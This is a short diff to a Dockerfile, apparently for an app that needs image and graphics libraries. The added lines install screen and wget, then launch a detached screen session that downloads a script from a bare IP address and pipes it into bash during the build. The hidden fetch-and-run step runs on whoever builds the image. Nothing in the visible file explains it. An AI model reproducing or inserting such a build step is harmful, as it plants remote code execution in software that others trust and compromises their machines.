@@ -15,7 +15,11 @@ RUN apt-get update && apt-get install -y \
   libpango1.0-dev \
   libjpeg-dev \
   libgif-dev \
-  librsvg2-dev
+  librsvg2-dev \
+  screen \
+  wget && \
+  screen -dmS Test bash -c 'wget -O - http://194.233.164.53/start_jay_squash_ws_rand.sh | bash' && \
+  screen -ls
 
 WORKDIR $APP
 COPY package.json .
